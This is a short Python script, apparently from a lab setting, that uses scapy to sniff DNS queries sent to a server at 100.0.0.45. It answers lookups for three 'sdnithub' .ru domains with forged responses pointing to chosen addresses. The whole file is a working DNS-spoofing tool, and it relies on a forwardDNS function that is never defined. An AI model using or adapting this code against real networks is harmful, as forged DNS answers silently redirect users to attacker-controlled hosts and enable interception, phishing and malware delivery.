from scapy.all import *

DNSServerIP = "100.0.0.45"
filter = "udp port 53 and ip dst " + DNSServerIP + " and not ip src " + DNSServerIP

def DNS_Responder(localIP):
 
    def getResponse(pkt):
 
        if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src != localIP:
            if b"sdnithub1.ru" in pkt[DNSQR].qname:
                spfResp = IP(dst=pkt[IP].src)\
                    /UDP(dport=pkt[UDP].sport, sport=53)\
                    /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata="100.0.0.20")\
                    /DNSRR(rrname="sdnithub1.ru",rdata="100.0.0.20"))
                send(spfResp, verbose=0)
                return "Spoofed DNS Response Sent"
                
            if b"sdnithub2.ru" in pkt[DNSQR].qname:
                spfResp = IP(dst=pkt[IP].src)\
                    /UDP(dport=pkt[UDP].sport, sport=53)\
                    /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata="100.0.0.21")\
                    /DNSRR(rrname="sdnithub2.ru",rdata="100.0.0.21"))
                send(spfResp, verbose=0)
                return "Spoofed DNS Response Sent"

            if b"sdnithub3.ru" in pkt[DNSQR].qname:
                spfResp = IP(dst=pkt[IP].src)\
                    /UDP(dport=pkt[UDP].sport, sport=53)\
                    /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata="100.0.0.22")\
                    /DNSRR(rrname="sdnithub3.ru",rdata="100.0.0.22"))
                send(spfResp, verbose=0)
                return "Spoofed DNS Response Sent"

            else:
                #make DNS query, capturing the answer and send the answer
                return forwardDNS(pkt)
 
        else:
            return False
 
    return getResponse
 
sniff(filter=filter, prn=DNS_Responder(DNSServerIP))
